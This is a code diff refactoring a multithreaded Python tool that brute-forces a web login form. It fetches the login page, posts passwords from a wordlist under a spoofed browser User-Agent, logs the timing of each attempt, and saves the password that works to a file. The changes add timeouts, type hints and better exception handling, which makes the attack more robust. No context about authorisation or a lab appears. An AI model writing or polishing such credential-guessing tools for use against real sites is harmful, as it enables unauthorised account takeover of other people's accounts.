@@ -23,21 +23,21 @@ UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/116.0.0.0 Safari
 found_event = threading.Event()
 lock = threading.Lock()
 
-def log(msg, level="info"):
+def log(msg: str, level: str = "info") -> None:
     now = datetime.now().strftime("%H:%M:%S")
     if COLOR_ENABLED:
-        if level == "success":
-            print(f"{Fore.GREEN}[{now}] {msg}{Style.RESET_ALL}")
-        elif level == "fail":
-            print(f"{Fore.RED}[{now}] {msg}{Style.RESET_ALL}")
-        elif level == "warn":
-            print(f"{Fore.YELLOW}[{now}] {msg}{Style.RESET_ALL}")
-        else:
-            print(f"[{now}] {msg}")
+        colors = {
+            "success": Fore.GREEN,
+            "fail": Fore.RED,
+            "warn": Fore.YELLOW,
+        }
+        color = colors.get(level, "")
+        reset = Style.RESET_ALL if color else ""
+        print(f"{color}[{now}] {msg}{reset}")
     else:
         print(f"[{now}] {msg}")
 
-def check_password(password):
+def check_password(password: str) -> bool:
     if not password.strip():
         log("[!] Empty password, skip.", "warn")
         return False
@@ -49,7 +49,7 @@ def check_password(password):
     session.headers.update({"User-Agent": UA, "Referer": LOGIN_PAGE})
 
     try:
-        r = session.get(LOGIN_PAGE)
+        r = session.get(LOGIN_PAGE, timeout=10)
         if r.status_code != 200:
             log(f"[!] Failed to load login page, status {r.status_code}", "warn")
             return False
@@ -67,30 +67,32 @@ def check_password(password):
             "next": "/arf/en/",
         }
 
-        start = int(time.time() * 1000)
-        post_resp = session.post(LOGIN_URL, data=data)
-        end = int(time.time() * 1000)
-        elapsed = end - start
+        start = time.perf_counter()
+        post_resp = session.post(LOGIN_URL, data=data, timeout=10)
+        elapsed_ms = int((time.perf_counter() - start) * 1000)
 
-        pwd_display = password.ljust(20)[:20]  # 固定宽度20字符
+        pwd_display = password.ljust(20)[:20]
 
-        if post_resp.status_code in [403, 500] or "Your username and/or password is incorrect" in post_resp.text:
-            log(f"[-] FAIL  | {elapsed:5d} ms | {pwd_display} | HTTP {post_resp.status_code}", "fail")
+        if post_resp.status_code in (403, 500) or "Your username and/or password is incorrect" in post_resp.text:
+            log(f"[-] FAIL  | {elapsed_ms:5d} ms | {pwd_display} | HTTP {post_resp.status_code}", "fail")
             return False
         else:
-            log(f"[+] FOUND | {elapsed:5d} ms | {pwd_display}", "success")
+            log(f"[+] FOUND | {elapsed_ms:5d} ms | {pwd_display}", "success")
             with lock:
-                with open(FOUND_FLAG, "w") as f:
+                with open(FOUND_FLAG, "w", encoding="utf-8") as f:
                     f.write(password)
             found_event.set()
             return True
 
+    except requests.RequestException as e:
+        log(f"[!] Request exception for password '{password}': {e}", "warn")
+        return False
     except Exception as e:
-        log(f"[!] Exception for password '{password}': {e}", "warn")
+        log(f"[!] Unexpected exception for password '{password}': {e}", "warn")
         return False
 
-def main():
-    max_workers = 16  # 默认16线程
+def main() -> None:
+    max_workers = 16
     if len(sys.argv) > 1:
         try:
             max_workers = int(sys.argv[1])
@@ -99,7 +101,7 @@ def main():
 
     log(f"Starting brute force with max_workers={max_workers}")
 
-    with open(PASSWORD_FILE, "r") as f:
+    with open(PASSWORD_FILE, encoding="utf-8") as f:
         passwords = [line.strip() for line in f if line.strip()]
 
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
@@ -109,7 +111,9 @@ def main():
                 break
 
     if found_event.is_set():
-        log(f"\n[✓] Correct password: {open(FOUND_FLAG).read()}", "success")
+        with open(FOUND_FLAG, encoding="utf-8") as f:
+            pwd = f.read().strip()
+        log(f"\n[✓] Correct password: {pwd}", "success")
     else:
         log("\n[✗] No valid password found.", "fail")
 
